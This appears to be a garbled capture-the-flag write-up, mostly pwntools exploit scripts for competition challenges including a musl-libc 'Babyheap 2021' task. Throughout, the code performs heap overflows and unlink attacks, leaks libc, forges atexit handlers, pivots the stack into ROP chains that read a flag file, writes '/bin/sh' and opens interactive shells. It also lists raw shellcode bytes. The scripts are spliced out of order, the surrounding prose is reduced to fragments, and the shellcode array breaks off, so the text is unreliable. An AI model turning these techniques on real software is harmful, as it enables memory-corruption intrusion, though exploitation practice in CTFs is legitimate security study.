 [0xBABECAFE000]  main  admin,  admin  
/bin/sh  [0xBABECAFE000]admin user test  admin.
chunk_base = 2224 + leak_heap + 0x10
payload = p64(0) + p64(chunk_base) + p64(0) * 2 + p64(leak_libc + 0x580DD)
payload = payload.ljust(0x68,b'\\x00') + p64(chunk_base + 0x100) # rdi
payload = payload.ljust(0xa0,b'\\x00') + p64(chunk_base + 0x120)# rsp
payload += p64(leak_libc + libc.symbols['open']) # rip
payload = payload.ljust(0x100,b'\\x00')
payload += b'flag'.ljust(0x20,b'\\x00') 
payload += p64(leak_libc + 0x0000000000026b72) # pop rdi
payload += p64(4)
payload += p64(leak_libc + 0x0000000000027529) # pop rsi
payload += p64(leak_heap)
payload += p64(leak_libc + 0x0000000000162866 ) # 0x0000000000162866 : pop rdx ; pop 
rbx ; ret
payload += p64(0x100) * 2
payload += p64(leak_libc + libc.symbols['read'])
payload += p64(leak_libc + 0x0000000000026b72) # pop rdi
payload += p64(1)
payload += p64(leak_libc + 0x0000000000027529) # pop rsi
payload += p64(leak_heap)
payload += p64(leak_libc + 0x0000000000162866 ) # 0x0000000000162866 : pop rdx ; pop 
rbx ; ret
payload += p64(0x100) * 2
payload += p64(leak_libc + libc.symbols['write'])
add(0x500,payload)
delete(7)'''
p.interactive()
from pwn import *
CODE = 0xdeadbeef000
context.log_level = 'debug'
#p = process(['python3', 'sb2.py'])
p=remote('111.186.59.29', 10087)
p.sendline("")
p.sendlineafter("?: \\\\x00", "3")
Babyheap 2021
musl-1.1.24, size
POC:
muslunlinkchunk, 
atexit, fun(arg), , setcontext, GG, ROP
rspripgg
p.sendafter("addr: \\\\x00", p64(0xBABECAFE000))
p.sendafter("size: \\\\x00", p64(0x8))
p.sendafter("data: \\\\x00", p64(0xdeadbeef000))
p.sendlineafter("?: \\\\x00", "1")
p.sendlineafter("?: \\\\x00", "3")
p.sendafter("addr: \\\\x00", p64(0xDEADBEF005A))
p.sendafter("size: \\\\x00", p64(0x8))
p.sendafter("data: \\\\x00", b"/bin/sh\\\\x00")
p.sendlineafter("?: \\\\x00", "3")
p.sendafter("addr: \\\\x00", p64(0xBABECAFE000))
p.sendafter("size: \\\\x00", p64(0x8))
p.sendafter("data: \\\\x00", p64(0xdeadbef0000))
p.interactive()
#! /usr/bin/python2
# coding=utf-8
import sys
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
elf = ELF("./pwn")
libc = ELF('libc.so')
def Log(name):  
    log.success(name+' = '+hex(eval(name)))
if(len(sys.argv)==1):           #local
    sh = process(["./libc.so", "./pwn"])    #process(["./pwn"]) process(["./libc.so", 
"./pwn"])
else:                           #remtoe
    sh = remote('111.186.59.11', 11124)
def Num(n):
    sh.sendline(str(n))
def Cmd(n):
    sh.recvuntil('Command: ')
    Num(n)
def Alloc(size, cont=''):
    Cmd(1)
    sh.recvuntil('Size: ')
    Num(size)
    if(len(cont)==0):
        cont = 'CHH\\n'
    sh.recvuntil('Content: ')
    sh.send(cont)
def Update(idx, size, cont):
    Cmd(2)
    sh.recvuntil('Index: ')
    Num(idx)
    sh.recvuntil('Size: ')
    Num(size)
    sh.recvuntil('Content: ')
    sh.send(cont)
def Overflow(idx, cont):
    Update(idx, 0x80000000, cont+'\\n')
def Delete(idx):
    Cmd(3)
    sh.recvuntil('Index: ')
    Num(idx)
def View(idx):
    Cmd(4)
    sh.recvuntil('Index: ')
    Num(idx)
def Exit():
    Cmd(5)
def GDB():
    gdb.attach(sh,  '''
    break *(0x00007ffff7f40000+0x175E)
    break *(0x00007ffff7f40000+0x19CE)
    telescope 0x00007ffff7ffba40 20
    break *(0x00007ffff7f40000+0x1B88)
    break *0x7ffff7f6a5dc
    ''')
#chunk arrange
Alloc(0x10)     #C0: overflow C1
Alloc(0x30)     #C1: 0x00007ffff7ffe340
Alloc(0xA0)     #C2
Alloc(0x30)     #C3
Alloc(0x10)     #C4
Delete(1)       #Bin[0x40]C1C3
Delete(3)
#partial overwrite next
exp = 'A'*0x10
exp+= flat(0x21, 0x40)
Overflow(0, exp)    #C1->next=C2, Bin[0x40]C2
#unlink Attack, C1->next->prev = C1->prev
Alloc(0x30)
#leak libc addr
View(2)
sh.recvuntil('CHH'.ljust(152, '\\x00'))
libc.address = u64(sh.recv(8))-0xb0a58
Log('libc.address')
#again
Alloc(0x40)     #idx:3
Alloc(0x60)     #idx:5
Delete(5)
#Overflow(0, exp)
#overwrite atexit_head
atexit_head = libc.address + 0xb2f58
chunk = libc.address + 0xb34a0
exp = 'A'*0x50
exp+= flat(0x61, 0xb00)
exp+= flat(atexit_head-0x18, chunk)
Overflow(3, exp)
Alloc(0x60)     #trigger
#forge atexit list
exp = flat(libc.address + 0xb34b8, 0xdeadbeef, 0)
exp+= p64(0)
#void (*f[COUNT])(void *);
exp+= flat(0x123)*31
exp+= flat(libc.address+0x78d24)    #mov rdx, qword ptr [rdi + 0x30]; mov rsp, rdx; mov 
rdx, qword ptr [rdi + 0x38]; jmp rdx; 
#void *a[COUNT];
exp+= flat(0x4)*31
exp+= flat(libc.address+0xb3320)    #sigframe addr  
Overflow(3, exp)
#ROP
buf = libc.address+0xb3F00
rdi = libc.address+0x15291
rsi = libc.address+0x1d829
rdx = libc.address+0x2cdda
rax = libc.address+0x16a16
ret = libc.address+0x15292
syscall = libc.address+0x23720
def Call(sys, A, B, C):
    return flat(rax, sys, rdi, A, rsi, B, rdx, C, syscall)
exp = '\\x00'*0x30
exp+= flat(libc.address+0xb3360)
exp+= flat(ret)
exp+= Call(0, 0, buf, 0x10)
exp+= Call(2, buf, 0, 0)
exp+= Call(0, 3, buf, 0x30)
exp+= Call(1, 1, buf, 0x30)
Overflow(0, exp)
#GDB()
#trigger exit()=>atexit()=>ROP
Exit()
sh.sendline('flag\\x00')
sh.interactive()
MISC
uc_baaaby
DATA = 0xbabecafe000
check_data = os.urandom(50)  DATA
 DATA + 0x80016, check_datamd5
shellcodeshellcode0x233
 check_data  
exp
'''
mal: malloc+214: $r14 = 0x00007ffff7ffba40
flag{0ld_mus1_n3ver_d1e_6dcd57ef}
'''
from pwn import *
code = [0x49, 0xBD, 0x00, 0xE0, 0xAF, 0xEC, 0xAB, 0x0B, 0x00, 0x00, 0x90, 0xB8, 0x01, 
0x23, 0x45, 0x67, 0xBB, 0x89, 0xAB, 0xCD, 0xEF, 0xB9, 0xFE, 0xDC, 0xBA, 0x98, 0xBA, 
0x76, 0x54, 0x32, 0x10, 0xC7, 0x45, 0x32, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x45, 0x36, 
0x00, 0x00, 0x90, 0x01, 0x48, 0xC7, 0x45, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x89, 0xCE, 
0x03, 0x45, 0x00, 0x31, 0xD6, 0x21, 0xDE, 0x31, 0xD6, 0x67, 0x8D, 0x84, 0x06, 0x78, 
0xA4, 0x6A, 0xD7, 0xC1, 0xC0, 0x07, 0x01, 0xD8, 0x89, 0xDE, 0x03, 0x55, 0x04, 0x31, 
0xCE, 0x21, 0xC6, 0x31, 0xCE, 0x67, 0x8D, 0x94, 0x16, 0x56, 0xB7, 0xC7, 0xE8, 0xC1, 
0xC2, 0x0C, 0x01, 0xC2, 0x89, 0xC6, 0x03, 0x4D, 0x08, 0x31, 0xDE, 0x21, 0xD6, 0x31, 
0xDE, 0x67, 0x8D, 0x8C, 0x0E, 0xDB, 0x70, 0x20, 0x24, 0xC1, 0xC1, 0x11, 0x01, 0xD1, 
0x89, 0xD6, 0x03, 0x5D, 0x0C, 0x31, 0xC6, 0x21, 0xCE, 0x31, 0xC6, 0x67, 0x8D, 0x9C, 
0x1E, 0xEE, 0xCE, 0xBD, 0xC1, 0xC1, 0xC3, 0x16, 0x01, 0xCB, 0x89, 0xCE, 0x03, 0x45, 
0x10, 0x31, 0xD6, 0x21, 0xDE, 0x31, 0xD6, 0x67, 0x8D, 0x84, 0x06, 0xAF, 0x0F, 0x7C, 
0xF5, 0xC1, 0xC0, 0x07, 0x01, 0xD8, 0x89, 0xDE, 0x03, 0x55, 0x14, 0x31, 0xCE, 0x21, 
0xC6, 0x31, 0xCE, 0x67, 0x8D, 0x94, 0x16, 0x2A, 0xC6, 0x87, 0x47, 0xC1, 0xC2, 0x0C, 